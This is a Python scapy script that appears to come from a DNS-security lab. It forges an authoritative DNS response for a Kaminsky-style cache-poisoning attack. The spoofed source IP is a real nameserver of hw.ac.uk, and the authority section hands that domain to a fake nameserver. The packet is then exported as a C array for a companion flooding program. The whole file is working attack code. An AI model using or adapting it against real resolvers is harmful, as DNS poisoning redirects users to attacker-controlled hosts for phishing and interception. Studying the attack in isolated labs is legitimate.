#!/usr/bin/python3
from scapy.all import *

targetName = 'azckd.hw.ac.uk'
targetDomain = 'hw.ac.uk'

# find the true name servers for the target domain
# dig +short $(dig +short NS example.com), there are two:
# 137.195.101.250, 137.195.151.105
# the C code will modify src,qname,rrname and the id field

# reply pkt from target domain NSs to the local DNS server
IPpkt = IP(src='137.195.101.250', dst='10.0.2.2', chksum=0)
UDPpkt = UDP(sport=53, dport=33333, chksum=0)

# Question section
Qdsec  = DNSQR(qname=targetName)
# Answer section, any IPs(rdata) are fine
Anssec = DNSRR(rrname=targetName, type='A',
               rdata='1.2.3.4', ttl=259200)
# Authority section (the main goal of the attack)               
NSsec  = DNSRR(rrname=targetDomain, type='NS',
               rdata='ns01.fake_ns.com', ttl=259200)

# http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
DNSpkt = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)
Replypkt = IPpkt/UDPpkt/DNSpkt

with open('ip_resp.bin', 'wb') as f:
  f.write(bytes(Replypkt))
  Replypkt.show()
 
#send(Replypkt)


def convert_to_c_array(input_file, output_file, array_name):
    with open(input_file, 'rb') as f:
        data = f.read()
    
    with open(output_file, 'w') as f:
        f.write("#include <stdint.h>\n\n")
        f.write("const uint8_t %s[] = {" % array_name)
        for byte in data:
            f.write("0x{:02x}, ".format(byte))
        f.write("};\n\n")
        f.write("const size_t %s_len = sizeof(%s);\n" % (array_name, array_name))

convert_to_c_array("ip_resp.bin", "packet1.h", "packet1")


